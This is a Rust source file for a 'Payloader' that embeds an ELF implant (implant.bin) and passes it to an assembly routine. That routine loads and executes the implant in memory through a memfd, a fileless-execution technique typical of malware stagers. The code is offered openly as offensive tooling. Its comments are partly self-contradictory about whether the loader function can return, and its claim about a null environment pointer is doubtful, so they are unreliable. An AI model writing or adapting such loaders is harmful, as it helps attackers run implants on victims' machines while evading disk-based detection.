//! # Payloader – Rust FFI wrapper for the memfd ELF loader
//!
//! This crate embeds an ELF payload (`implant.bin`) and invokes an external
//! function `load_and_exec` (implemented in assembly) to validate, load, and
//! execute the payload via a memfd‑based in‑memory loader.
//!
//! The program constructs a minimal `argv` array (containing the program name
//! `"implant"`) and passes a null `envp` pointer. It then calls the diverging
//! foreign function, which either replaces the current process with the payload
//! or, on error, returns a negative error code (though the assembly function is
//! declared as diverging, implying it never returns on success; on error it might
//! return, but the safe Rust wrapper cannot rely on that behaviour).
//!
//! # Safety
//!
//! The foreign function `load_and_exec` is assumed to be correctly implemented
//! according to the system calling convention. The caller must ensure that:
//!   - `buffer` points to a valid memory region of at least `len` bytes.
//!   - `argv` is a valid pointer to a null‑terminated array of C string pointers.
//!   - `envp` is either null (meaning inherit the current environment) or a valid
//!     null‑terminated array.
//!   - The function will not return on success; if it does return, the process
//!     may be in an inconsistent state. The Rust wrapper treats it as diverging.
//!
//! The `make_argv` helper safely constructs a null‑terminated `argv` array from
//! Rust string slices, handling interior NUL bytes via the `NulError` type.

use std::ffi::{CString, NulError};
use std::os::raw::{c_char, c_int, c_void};
use std::ptr;

/// Foreign function: load_and_exec – defined in an external assembly module.
///
/// # Parameters
/// - `buffer`: pointer to the ELF binary data in memory.
/// - `len`:    size of the ELF binary in bytes.
/// - `argv`:   pointer to a null‑terminated array of C string pointers.
/// - `envp`:   pointer to a null‑terminated array of environment strings,
///            or null to use the current environment.
/// - `seal_mask`: bitmask of seal flags to apply before execution (e.g., `F_SEAL_WRITE`).
///
/// # Behaviour
/// This function is declared with the `!` return type, indicating that it
/// **never returns** when execution is successful. If an error occurs, it may
/// return a negative error code (the exact value is implementation‑defined).
/// However, because the Rust type system cannot represent that nuance, the
/// function is marked as diverging, and any return is considered an abnormal
/// condition. The caller should treat a return as a fatal error.
///
/// # Safety
/// - `buffer` must point to at least `len` readable bytes.
/// - `argv` must point to a valid null‑terminated array; each element must be
///   a valid C string pointer, and the array must remain valid for the duration
///   of the call (though on success the call never returns, so validity is moot).
/// - `envp` must satisfy the same conditions as `argv`, or be null.
/// - The function will not unwind; it may terminate the process or replace it.
unsafe extern "C" {
    fn load_and_exec(
        buffer: *const c_void,
        len: usize,
        argv: *const *const c_char,
        envp: *const *const c_char,
        seal_mask: c_int,
    ) -> !;
}

/// Constructs a null‑terminated `argv` array suitable for passing to `load_and_exec`.
///
/// Given a slice of Rust string slices, this function:
///   1. Converts each string to a `CString`, ensuring no interior NUL bytes.
///   2. Collects the raw pointers to those C strings.
///   3. Appends a null pointer to terminate the array.
///
/// # Arguments
/// * `args` – A slice of string slices representing the argument list
///            (conventionally, the first element is the program name).
///
/// # Returns
/// On success, returns a tuple `(owned, ptrs)` where:
/// - `owned` is the vector of `CString` instances that own the actual string data.
/// - `ptrs`  is the vector of raw pointers (including the terminating null)
///            that can be passed directly to the foreign function.
///
/// The `owned` vector must be kept alive for as long as `ptrs` is used,
/// because the pointers reference the data inside the `CString`s.
///
/// # Errors
/// Returns `NulError` if any input string contains an interior NUL byte,
/// which cannot be represented as a valid C string.
fn make_argv(args: &[&str]) -> Result<(Vec<CString>, Vec<*const c_char>), NulError> {
    // Convert each string slice to a CString, checking for interior NULs.
    let owned: Vec<CString> = args
        .iter()
        .map(|&s| CString::new(s))
        .collect::<Result<_, _>>()?;

    // Build the pointer array: one pointer per argument, plus a trailing null.
    let mut ptrs: Vec<*const c_char> = owned.iter().map(|s| s.as_ptr()).collect();
    ptrs.push(ptr::null());

    Ok((owned, ptrs))
}

/// Entry point.
///
/// 1. Embeds the payload binary (expected at `../../payload/implant.bin`) as a
///    byte slice `PAYLOAD`.
/// 2. Constructs the `argv` array with a single argument `"implant"`.
/// 3. Calls the unsafe foreign function `load_and_exec` with the payload data,
///    the constructed `argv`, a null `envp`, and seal mask `0`.
/// 4. If `load_and_exec` returns (which should only happen on error), prints
///    an error message and exits with code 1. The `unreachable!` macro documents
///    that normal execution never reaches that point.
fn main() {
    // Embed the payload binary at compile time.
    const PAYLOAD: &[u8] = include_bytes!("../../payload/implant.bin");

    // Create a null‑terminated argv array containing the program name.
    let (_owned, argv_ptrs) = match make_argv(&["implant"]) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("Failed to create argv: {}", e);
            std::process::exit(1);
        }
    };

    // Use a null pointer for envp, meaning “inherit the current environment”.
    let envp: *const *const c_char = ptr::null();
    let seal_mask: c_int = 0;

    // SAFETY:
    // - `PAYLOAD.as_ptr()` points to a valid memory region of size `PAYLOAD.len()`.
    // - `argv_ptrs.as_ptr()` points to a valid null‑terminated array of pointers,
    //   and the strings are owned by `_owned`, which is kept alive for the duration
    //   of the call (the call never returns on success, so this is sufficient).
    // - `envp` is null, which is allowed.
    // - The foreign function is assumed to be correctly implemented.
    unsafe {
        load_and_exec(
            PAYLOAD.as_ptr() as *const c_void,
            PAYLOAD.len(),
            argv_ptrs.as_ptr(),
            envp,
            seal_mask,
        );
    }

    // If execution reaches here, `load_and_exec` returned, which should never happen
    // on a successful execution. This indicates an error in the loader or the payload.
    unreachable!("load_and_exec diverges; never runs");
}
